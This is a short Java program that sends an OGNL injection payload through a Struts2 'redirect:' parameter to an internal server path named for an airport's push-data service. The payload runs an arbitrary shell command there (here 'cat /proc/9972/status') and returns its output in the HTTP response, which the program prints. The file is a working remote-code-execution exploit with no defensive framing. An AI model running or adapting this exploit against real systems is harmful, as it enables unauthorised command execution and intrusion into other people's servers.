import java.io.InputStream;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.URL;
import java.net.URLConnection;

import org.apache.commons.io.IOUtils;

public class test4_UrlProxy {
    public static void main(String[] args) {
        try {
            String urlHead = "http://10.123.124.150/BaiYunAirport/pushData/pushData!push.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{";
            String urlTail = "})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}";
            String command = "cat /proc/9972/status";
            StringBuffer sb = new StringBuffer();
            for (String s : command.split(" ")) {
                if (sb.length() > 0) {
                    sb.append(",");
                }
                sb.append("'").append(s).append("'");

            }
            String u = urlHead + sb.toString() + urlTail;
            URL url = new URL(u);
            String query = url.getQuery();
            // InetSocketAddress addr = new InetSocketAddress("10.123.74.137", 808);
            // Proxy proxy = new Proxy(Proxy.Type.HTTP, addr);
            // URLConnection conn = url.openConnection(proxy);
            URLConnection conn = url.openConnection();

            InputStream in = conn.getInputStream();
            String s = IOUtils.toString(in);
            System.out.println(s);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
